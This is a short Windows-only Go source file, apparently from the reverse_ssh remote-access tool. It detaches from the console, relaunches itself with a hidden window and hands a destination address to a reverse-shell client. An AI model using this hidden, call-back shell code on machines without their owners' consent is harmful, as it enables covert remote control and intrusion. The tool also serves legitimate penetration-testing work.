//go:build windows

package main

import (
	"log"
	"os"
	"os/exec"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/client"
)

func Fork(destination, fingerprint, proxyaddress string) error {
	log.Println("Forking")

	modkernel32 := syscall.NewLazyDLL("kernel32.dll")
	procAttachConsole := modkernel32.NewProc("FreeConsole")
	syscall.Syscall(procAttachConsole.Addr(), 0, 0, 0, 0)

	path, _ := os.Executable()

	cmd := exec.Command(path, append([]string{"--foreground"}, os.Args[1:]...)...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Start()

	if cmd.Process != nil {
		cmd.Process.Release()
	}

	return err
}

func Run(destination, fingerprint, proxyaddress string) {
	client.Run(destination, fingerprint, proxyaddress)
}
